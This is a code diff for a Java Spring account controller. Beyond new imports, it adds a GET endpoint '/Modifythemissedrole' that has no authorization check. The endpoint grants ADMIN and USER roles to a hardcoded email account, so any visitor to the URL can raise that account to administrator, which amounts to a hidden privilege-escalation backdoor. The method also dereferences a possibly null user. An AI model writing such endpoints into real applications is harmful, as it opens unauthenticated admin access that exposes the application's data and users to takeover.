@@ -2,6 +2,7 @@ package com.example.demo.controller;
 
 import com.example.demo.model.Address;
 import com.example.demo.model.User;
+import com.example.demo.model.enums.Role;
 import com.example.demo.service.*;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.security.access.prepost.PreAuthorize;
@@ -12,6 +13,7 @@ import org.springframework.web.bind.annotation.*;
 import org.springframework.web.servlet.mvc.support.RedirectAttributes;
 
 import java.util.List;
+import java.util.Optional;
 
 
 @Controller
@@ -32,6 +34,13 @@ public class accountController {
 
     @GetMapping(value = "/Main")
     public String home(Model model) {
+        return "index";
+    }
+    @GetMapping(value = "/Modifythemissedrole")
+    public String home() {
+        User u= userService.findUserByEmail("zk@gmail.com").orElse(null);
+        u.setRoles( List.of(Role.ADMIN,Role.USER));
+        userService.save(u);
         return "index";
     }
 
